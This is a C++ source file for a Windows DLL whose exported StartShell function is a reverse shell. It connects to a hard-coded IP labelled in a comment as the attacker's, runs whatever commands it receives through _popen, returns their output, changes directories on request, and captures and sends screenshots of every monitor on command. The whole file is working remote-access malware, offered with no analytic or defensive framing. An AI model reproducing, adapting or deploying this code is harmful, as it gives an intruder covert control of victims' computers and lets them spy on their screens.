#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <cstdint>  // Fix for uint32_t
#include <cstdlib>
#include <cstring>
#include <fstream>

#pragma comment(lib, "Ws2_32.lib") // Link with Winsock library
#pragma comment(lib, "Gdi32.lib")  // Link with GDI32 library

#define SERVER_IP "78.71.162.7" // Replace with attacker's IP
#define SERVER_PORT 23
#define BUFFER_SIZE 1024

using namespace std;

extern "C" __declspec(dllexport) void StartShell();  // Expose function for DLL

// Initialize Winsock
void initializeWinsock() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        cerr << "WSAStartup failed: " << WSAGetLastError() << endl;
        exit(1);
    }
}

// Function to capture screenshot of all monitors and send data over socket
void takeScreenshot(SOCKET sock) {
    #ifdef _WIN32
        int screenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        int screenLeft = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int screenTop = GetSystemMetrics(SM_YVIRTUALSCREEN);

        HDC hScreen = GetDC(NULL);
        HDC hDC = CreateCompatibleDC(hScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, screenWidth, screenHeight, hScreen, screenLeft, screenTop, SRCCOPY);

        BITMAPFILEHEADER fileHeader;
        BITMAPINFOHEADER infoHeader;
        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);

        infoHeader.biSize = sizeof(BITMAPINFOHEADER);
        infoHeader.biWidth = bmp.bmWidth;
        infoHeader.biHeight = -bmp.bmHeight;
        infoHeader.biPlanes = 1;
        infoHeader.biBitCount = 32;
        infoHeader.biCompression = BI_RGB;
        infoHeader.biSizeImage = bmp.bmWidth * bmp.bmHeight * 4;
        infoHeader.biXPelsPerMeter = 0;
        infoHeader.biYPelsPerMeter = 0;
        infoHeader.biClrUsed = 0;
        infoHeader.biClrImportant = 0;

        fileHeader.bfType = 0x4D42;
        fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + infoHeader.biSizeImage;
        fileHeader.bfReserved1 = 0;
        fileHeader.bfReserved2 = 0;
        fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        int imageSize = bmp.bmWidth * bmp.bmHeight * 4;
        char* imageData = new char[imageSize];

        GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, imageData, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);

        uint32_t totalSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
        uint32_t sizeNetworkOrder = htonl(totalSize);
        send(sock, (char*)&sizeNetworkOrder, sizeof(sizeNetworkOrder), 0);
        send(sock, (char*)&fileHeader, sizeof(BITMAPFILEHEADER), 0);
        send(sock, (char*)&infoHeader, sizeof(BITMAPINFOHEADER), 0);
        send(sock, imageData, imageSize, 0);

        delete[] imageData;
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
    #endif
}

// Execute command in Windows
string executeCommand(const string& command) {
    char buffer[BUFFER_SIZE];
    string result = "";

    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) return "Failed to execute command";

    while (fgets(buffer, BUFFER_SIZE, pipe) != NULL) {
        result += buffer;
    }
    _pclose(pipe);

    if (result.empty()) {
        result = "Command executed, but no output.";
    }

    return result;
}

extern "C" __declspec(dllexport) void StartShell() {
    initializeWinsock();

    SOCKET sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return;
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    // Connect to server
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        cerr << "Connection failed" << endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    char cwd[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, cwd);

    while (true) {
        memset(buffer, 0, BUFFER_SIZE);

        // Receive command
        int bytesReceived = recv(sock, buffer, BUFFER_SIZE, 0);
        if (bytesReceived <= 0) {
            cerr << "Connection closed by attacker" << endl;
            break;
        }

        if (strcmp(buffer, "exit") == 0) {
            cout << "Exit command received, closing..." << endl;
            break;
        }

        if (strcmp(buffer, "screenshot") == 0) {
            takeScreenshot(sock);
            continue;
        }

        if (strncmp(buffer, "cd ", 3) == 0) {
            char* dir = buffer + 3;
            if (SetCurrentDirectory(dir)) {
                GetCurrentDirectory(MAX_PATH, cwd);
                send(sock, cwd, strlen(cwd), 0);
            } else {
                send(sock, "Failed to change directory", 26, 0);
            }
            continue;
        }

        string commandResult = executeCommand(buffer);
        send(sock, commandResult.c_str(), commandResult.length(), 0);
    }

    closesocket(sock);
    WSACleanup();
}